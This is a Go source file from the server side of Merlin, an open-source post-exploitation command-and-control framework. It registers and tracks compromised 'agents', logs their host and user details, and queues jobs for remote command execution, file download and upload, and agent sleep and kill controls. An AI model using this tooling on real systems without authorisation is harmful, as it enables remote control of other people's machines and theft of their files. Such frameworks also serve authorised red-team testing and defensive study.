// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2018  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agents

import (
	// Standard
	"os"
	"time"
	"fmt"
	"path/filepath"
	"path"
	"encoding/json"
	"io/ioutil"
	"crypto/sha1"
	"io"
	"encoding/base64"
	"strings"
	"errors"
	"strconv"

	// 3rd Party
	"github.com/satori/go.uuid"
	"github.com/fatih/color"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/logging"
	"github.com/olekukonko/tablewriter"
)

// Global Variables

// Agents contains all of the instantiated agent object that are accessed by other modules
var Agents = make(map[uuid.UUID]*agent)
var paddingMax = 4096

type agent struct {
	ID            uuid.UUID
	Platform      string
	Architecture  string
	UserName      string
	UserGUID      string
	HostName      string
	Ips           []string
	Pid           int
	agentLog      *os.File
	channel       chan []Job
	InitialCheckIn      time.Time
	StatusCheckIn      time.Time
	Version       string
	Build         string
	WaitTime      string
	PaddingMax    int
	MaxRetry      int
	FailedCheckin int
	Skew		  int64
	Proto		  string
}

// InitialCheckIn is run on the first communication with an agent and is used to instantiate an agent object
func InitialCheckIn(j messages.Base) {
	if core.Debug{
		message("debug", "Entering into agents.InitialCheckIn function")
		message("debug", fmt.Sprintf("Base Message Type: %s", j.Type))
		message("debug", fmt.Sprintf("Base Message Payload: %s", j.Payload))
}
	message("success", fmt.Sprintf("Received new agent checkin from %s", j.ID))

	// Unmarshal AgentInfo from Base
	var agentInfo messages.AgentInfo
	agentInfoPayload, errAgentInfoPayload := json.Marshal(j.Payload)
	if errAgentInfoPayload != nil{
		message("warn", fmt.Sprintf("There was an error marshalling the messages.Base Payload: %s",
			errAgentInfoPayload.Error()))
		return
	}
	errA := json.Unmarshal(agentInfoPayload, &agentInfo)
	if errA != nil{
		message("warn", fmt.Sprintf("There was an error unmarshaling the AgentInfo message: %s", errA.Error()))
		return
	}

	// Unmarshal SysInfo from AgentInfo
	var sysInfo messages.SysInfo
	sysInfoPayload, errSysInfoPayload := json.Marshal(agentInfo.SysInfo)
	if errSysInfoPayload != nil{
		message("warn", fmt.Sprintf("There was an error marshalling the SysInfo Payload of the AgentInfo" +
			" message: %s", errSysInfoPayload.Error()))
		return
	}
	errS := json.Unmarshal(sysInfoPayload, &sysInfo)
	if errS != nil{
		message("warn", fmt.Sprintf("There was an error unmarshaling the SysInfo message: %s",
			errS.Error()))
		return
	}

	if core.Verbose {
		message("info", fmt.Sprintf("Agent UUID: %s", j.ID))
		message("info", fmt.Sprintf("Agent Proto: %s", agentInfo.Proto))
		message("info", fmt.Sprintf("Platform: %s", sysInfo.Platform))
		message("info", fmt.Sprintf("Architecture: %s", sysInfo.Architecture))
		message("info", fmt.Sprintf("Hostname: %s", sysInfo.HostName))
		message("info", fmt.Sprintf("Username: %s", sysInfo.UserName))
		message("info", fmt.Sprintf("IpAddrs: %v", sysInfo.Ips))
	}
	// TODO move currentDir to a core library
	agentsDir := filepath.Join(core.CurrentDir, "data", "agents")

	if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
		os.Mkdir(agentsDir, os.ModeDir)
	}
	if _, err := os.Stat(filepath.Join(agentsDir, j.ID.String())); os.IsNotExist(err) {
		os.Mkdir(filepath.Join(agentsDir, j.ID.String()), os.ModeDir)
		os.Create(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"))

		if core.Verbose {
			message("note",fmt.Sprintf("Created agent log file at: %s agent_log.txt",
				path.Join(agentsDir, j.ID.String())))
		}
	}

	f, err := os.OpenFile(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"), os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	// Add custom agent struct to global agents map
	Agents[j.ID] = &agent{
		Version: agentInfo.Version, Build: agentInfo.Build, WaitTime: agentInfo.WaitTime, 
		PaddingMax: agentInfo.PaddingMax, MaxRetry: agentInfo.MaxRetry, FailedCheckin: agentInfo.FailedCheckin,
		Skew: agentInfo.Skew, Proto: agentInfo.Proto,
		ID: j.ID, UserName: sysInfo.UserName, UserGUID: sysInfo.UserGUID, Platform: sysInfo.Platform,
		Architecture: sysInfo.Architecture, Ips: sysInfo.Ips,
		HostName: sysInfo.HostName, Pid: sysInfo.Pid, channel: make(chan []Job, 10),
		agentLog: f, InitialCheckIn: time.Now(), StatusCheckIn: time.Now()}

	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Initial check in for agent %s\r\n", time.Now(), j.ID))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent Version: %s\r\n", time.Now(), agentInfo.Version))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent Build: %s\r\n", time.Now(), agentInfo.Build))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]WaitTime: %s\r\n", time.Now(), agentInfo.WaitTime))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]PaddingMax: %d\r\n", time.Now(), agentInfo.PaddingMax))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]MaxRetry: %d\r\n", time.Now(), agentInfo.MaxRetry))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]FailedCheckin: %d\r\n", time.Now(), agentInfo.FailedCheckin))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Skew: %d\r\n", time.Now(), agentInfo.Skew))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Proto: %s\r\n", time.Now(), agentInfo.Proto))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Platform: %s\r\n", time.Now(), sysInfo.Platform))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Platform: %s\r\n", time.Now(), sysInfo.Platform))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Architecture: %s\r\n", time.Now(), sysInfo.Architecture))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]HostName: %s\r\n", time.Now(), sysInfo.HostName))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserName: %s\r\n", time.Now(), sysInfo.UserName))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserGUID: %s\r\n", time.Now(), sysInfo.UserGUID))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Process ID: %d\r\n", time.Now(), sysInfo.Pid))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]IPs: %v\r\n", time.Now(), sysInfo.Ips))
}

// StatusCheckIn is the function that is run when an agent sends a message back to server, checking in for additional instructions
func StatusCheckIn(j messages.Base) (messages.Base, error) {
	// Check to make sure agent UUID is in dataset
	_, ok := Agents[j.ID]
	if !ok {
		message("warn", fmt.Sprintf("Orphaned agent %s has checked in. Instructing agent to re-initialize...", j.ID.String()))
		logging.Server(fmt.Sprintf("[Orphaned agent %s has checked in", j.ID.String()))
		job := Job{
			ID: core.RandStringBytesMaskImprSrc(10),
			Type: "initialize",
			Created: time.Now(),
			Status: "created",
		}
		m, mErr := GetMessageForJob(j.ID, job)
		return m, mErr
	}

	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent status check in\r\n", time.Now()))
	if core.Verbose {
		message("success", fmt.Sprintf("Received agent status checkin from %s", j.ID))
	}
	if core.Debug {
		message("debug", fmt.Sprintf("Received agent status checkin from %s", j.ID))
		message("debug", fmt.Sprintf("Channel length: %d", len(Agents[j.ID].channel)))
		message("debug", fmt.Sprintf("Channel content: %s", Agents[j.ID].channel))
	}

	Agents[j.ID].StatusCheckIn = time.Now()
	// Check to see if there are any jobs
	if len(Agents[j.ID].channel) >= 1 {
		job := <-Agents[j.ID].channel
		if core.Debug {
			message("debug", fmt.Sprintf("Channel command string: %s", job))
			message("debug", fmt.Sprintf("Agent command type: %s", job[0].Type))
		}

		m, mErr := GetMessageForJob(j.ID, job[0])
		return m, mErr
	}
	m := messages.Base{
		Version: 1.0,
		ID:      j.ID,
		Type:    "ServerOk",
		Padding: core.RandStringBytesMaskImprSrc(paddingMax),
	}
	return m,nil
	}

func marshalMessage(m interface{}) []byte {
	k, err := json.Marshal(m)
	if err != nil {
		message("warn", "There was an error marshaling the JSON object")
		message("warn", err.Error())
	}
	return k
}

// UpdateInfo is used to update an agent's information with the passed in message data
func UpdateInfo(j messages.Base, p messages.AgentInfo) {
	_, ok := Agents[j.ID]

	if !ok {
		message("warn","The agent was not found while processing an AgentInfo message" )
		return
	}
	if core.Debug {
		message("debug","Processing new agent info")
		message("debug",fmt.Sprintf("Agent Version: %s", p.Version))
		message("debug",fmt.Sprintf("Agent Build: %s", p.Build))
		message("debug",fmt.Sprintf("Agent waitTime: %s", p.WaitTime))
		message("debug",fmt.Sprintf("Agent skew: %d", p.Skew))
		message("debug",fmt.Sprintf("Agent paddingMax: %d", p.PaddingMax))
		message("debug",fmt.Sprintf("Agent maxRetry: %d", p.MaxRetry))
		message("debug",fmt.Sprintf("Agent failedCheckin: %d", p.FailedCheckin))
		message("debug",fmt.Sprintf("Agent proto: %s", p.Proto))
	}
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("Processing AgentInfo message:\r\n"))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Version: %s \r\n", p.Version))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Build: %s \r\n", p.Build))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent waitTime: %s \r\n", p.WaitTime))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent skew: %d \r\n", p.Skew))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent paddingMax: %d \r\n", p.PaddingMax))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent maxRetry: %d \r\n", p.MaxRetry))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent failedCheckin: %d \r\n", p.FailedCheckin))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent proto: %s \r\n", p.Proto))

	Agents[j.ID].Version = p.Version
	Agents[j.ID].Build = p.Build
	Agents[j.ID].WaitTime = p.WaitTime
	Agents[j.ID].Skew = p.Skew
	Agents[j.ID].PaddingMax = p.PaddingMax
	Agents[j.ID].MaxRetry = p.MaxRetry
	Agents[j.ID].FailedCheckin = p.FailedCheckin
	Agents[j.ID].Proto = p.Proto
}

// Log is used to write log messages to the agent's log file
func Log (agentID uuid.UUID, logMessage string) {
	Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]%s\r\n", time.Now(), logMessage))
}

// GetAgentList returns a list of agents that exist and is used for command line tab completion
func GetAgentList() func(string) []string {
	return func(line string) []string {
		a := make([]string, 0)
		for k := range Agents {
			a = append(a, k.String())
		}
		return a
	}
}

// ShowInfo lists all of the agent's structure value in a table
func ShowInfo(agentID uuid.UUID){

	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)

	data := [][]string{
		{"Status", GetAgentStatus(agentID)},
		{"ID", Agents[agentID].ID.String()},
		{"Platform", Agents[agentID].Platform},
		{"Architecture", Agents[agentID].Architecture},
		{"UserName", Agents[agentID].UserName},
		{"User GUID", Agents[agentID].UserGUID},
		{"Hostname", Agents[agentID].HostName},
		{"Process ID", strconv.Itoa(Agents[agentID].Pid)},
		{"IP", fmt.Sprintf("%v", Agents[agentID].Ips)},
		{"Initial Check In", Agents[agentID].InitialCheckIn.String()},
		{"Last Check In", Agents[agentID].StatusCheckIn.String()},
		{"Agent Version", Agents[agentID].Version},
		{"Agent Build", Agents[agentID].Build},
		{"Agent Wait Time", Agents[agentID].WaitTime},
		{"Agent Wait Time Skew", fmt.Sprintf(strconv.FormatInt(Agents[agentID].Skew, 10))},
		{"Agent Message Padding Max", strconv.Itoa(Agents[agentID].PaddingMax)},
		{"Agent Max Retries", strconv.Itoa(Agents[agentID].MaxRetry)},
		{"Agent Failed Check In", strconv.Itoa(Agents[agentID].FailedCheckin)},
		{"Agent Communication Protocol", Agents[agentID].Proto},
	}
	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
}

// message is used to print a message to the command line
func message (level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// AddJob creates a job and adds it to the specified agent's channel and returns the Job ID or an error
func AddJob(agentID uuid.UUID, jobType string, jobArgs []string) (string, error){
	// TODO turn this into a method of the agent struct
	if core.Debug{
		message("debug", fmt.Sprintf("In agents.AddJob function for agent: %s", agentID.String()))
		message("debug", fmt.Sprintf("In agents.AddJob function for type: %s", jobType))
		message("debug", fmt.Sprintf("In agents.AddJob function for command: %s", jobArgs))
	}

	isAgent := false
	// Verify the passed in agent is known
	for k := range Agents {
		if Agents[k].ID == agentID {
			isAgent = true
		}
	}
	if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff"{isAgent = true}

	if isAgent {
		job := Job{
			Type: jobType,
			Status: "created",
			Args: jobArgs,
			Created: time.Now(),
		}

		if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff"{
			for k := range Agents {
				s := Agents[k].channel
				job.ID = core.RandStringBytesMaskImprSrc(10)
				s <- []Job{job}
				Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Created job Type:%s, ID:%s, Status:%s, " +
					"Args:%s \r\n", time.Now(), job.Type, job.ID, job.Status, job.Args))
			}
			return job.ID, nil
		}
		job.ID = core.RandStringBytesMaskImprSrc(10)
		s := Agents[agentID].channel
		s <- []Job{job}
		Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Created job Type:%s, ID:%s, Status:%s, " +
			"Args:%s \r\n", time.Now(), job.Type, job.ID, job.Status, job.Args))
		return job.ID, nil
	}
	return "", errors.New("invalid agent ID")
}

// GetMessageForJob returns a Message Base structure for the provided job type
func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
	// TODO should be moved to messages library
	m := messages.Base{
		Version: 1.0,
		ID:      agentID,
		Padding: core.RandStringBytesMaskImprSrc(paddingMax), // TODO shouldn't this be the agent.PaddingMax?
	}
	switch job.Type {
	case "cmd":
		m.Type = "CmdPayload"
		p := messages.CmdPayload{
			Command: job.Args[0],
			Job:     job.ID,
		}
		if len(job.Args) > 1 {
			p.Args = strings.Join(job.Args[1:], " ")
		}

		k := marshalMessage(p)
		m.Type = "CmdPayload"
		m.Payload = (*json.RawMessage)(&k)
	case "download":
		m.Type = "FileTransfer"
		Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Downloading file from agent at %s\n",
			time.Now(),
			job.Args[0]))

		p := messages.FileTransfer{
			FileLocation:	job.Args[0],
			Job:      		job.ID,
			IsDownload: false,
		}

		k := marshalMessage(p)
		m.Payload = (*json.RawMessage)(&k)
	case "initialize":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Type,
			Job:     job.ID,
		}
		// TODO I think I can move these last two steps to outside the case statement
		k := marshalMessage(p)
		m.Payload = (*json.RawMessage)(&k)
	case "kill":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}
		k := marshalMessage(p)
		m.Payload = (*json.RawMessage)(&k)
		err := RemoveAgent(agentID)
		if err != nil{
			message("warn",fmt.Sprintf("%s", err.Error()))
		} else{message("info",fmt.Sprintf("Agent %s was removed from the server", agentID.String()))}
	case "maxretry":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		k := marshalMessage(p)

		m.Payload = (*json.RawMessage)(&k)
	case "padding":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		k := marshalMessage(p)
		m.Payload = (*json.RawMessage)(&k)
	case "skew":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		k := marshalMessage(p)
		m.Payload = (*json.RawMessage)(&k)
	case "sleep":
		m.Type = "AgentControl"
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		k := marshalMessage(p)
		m.Payload = (*json.RawMessage)(&k)
	case "upload":
		m.Type = "FileTransfer"
		// TODO add error handling; check 2 args (src, dst)
		uploadFile, uploadFileErr := ioutil.ReadFile(job.Args[0])
		if uploadFileErr != nil {
			// TODO send "ServerOK"
			return m, fmt.Errorf("there was an error reading %s: %v", job.Type, uploadFileErr)
		}
		fileHash := sha1.New()
		io.WriteString(fileHash, string(uploadFile))
		Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Uploading file from server at %s of size %d" +
			" bytes and SHA-1: %x to agent at %s\r\n",
			time.Now(),
			job.Args[0],
			len(uploadFile),
			fileHash.Sum(nil),
			job.Args[1]))

		p := messages.FileTransfer{
			FileLocation: job.Args[1],
			FileBlob:     base64.StdEncoding.EncodeToString([]byte(uploadFile)),
			IsDownload:   true, // The agent will be downloading the file provided by the server in the FileBlob field
			Job:          job.ID,
		}
		k := marshalMessage(p)
		m.Payload = (*json.RawMessage)(&k)
	default:
		m.Type = "ServerOk"
		return m, errors.New("invalid job type, sending ServerOK")
	}
	return m, nil
}

// GetAgentStatus evaluates the agent's last check in time and max wait time to determine if it is active, delayed, or dead
func GetAgentStatus(agentID uuid.UUID) string {
	var status string
	dur, errDur := time.ParseDuration(Agents[agentID].WaitTime)
	if errDur != nil{
		message("warn", fmt.Sprintf("Error converting %s to a time duration: %s", Agents[agentID].WaitTime,
			errDur.Error()))
	}
	if Agents[agentID].StatusCheckIn.Add(dur).After(time.Now()){
		status = "Active"
	} else if Agents[agentID].StatusCheckIn.Add(dur * time.Duration(Agents[agentID].MaxRetry + 1)).After(time.Now()){ // +1 to account for skew
		status = "Delayed"
	} else{
		status = "Dead"
		}
	return status
}

// RemoveAgent deletes the agent object from Agents map by its ID
func RemoveAgent(agentID uuid.UUID) error {
	// Range over to make sure it exists, return error
	isAgent := false
	// Verify the passed in agent is known
	for k := range Agents {
		if Agents[k].ID == agentID {
			isAgent = true
		}
	}
	if isAgent {
		delete(Agents, agentID)
		return nil
	}
	return fmt.Errorf("%s is not a known agent and was not removed", agentID.String())

}
// Job is a structure for holding data for single task assigned to a single agent
type Job struct {
	ID		string
	Type 	string
	Status 	string		// Valid Statuses are created, sent, returned //TODO this might not be needed
	Args 	[]string
	Created	time.Time
}
// TODO configure all message to be displayed on the CLI to be returned as errors and not written to the CLI here